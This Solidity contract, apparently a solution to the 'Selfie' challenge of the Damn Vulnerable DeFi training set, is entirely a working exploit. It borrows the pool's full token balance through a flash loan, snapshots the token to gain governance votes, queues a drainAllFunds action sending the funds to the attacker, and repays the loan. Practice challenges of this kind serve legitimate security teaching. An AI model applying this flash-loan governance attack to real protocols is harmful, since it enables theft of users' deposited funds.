import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot token;
    address owner;

    constructor(
        address _selfiePool,
        address _token,
        address _owner
    ) {
        selfiePool = SelfiePool(_selfiePool);
        token = DamnValuableTokenSnapshot(_token);
        owner = _owner;
    }

    function attack() external {
        uint256 amountBorrow = selfiePool.token().balanceOf(
            address(selfiePool)
        );
        selfiePool.flashLoan(amountBorrow);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        token.snapshot();
        selfiePool.governance().queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(selfiePool), _amount);
    }
}
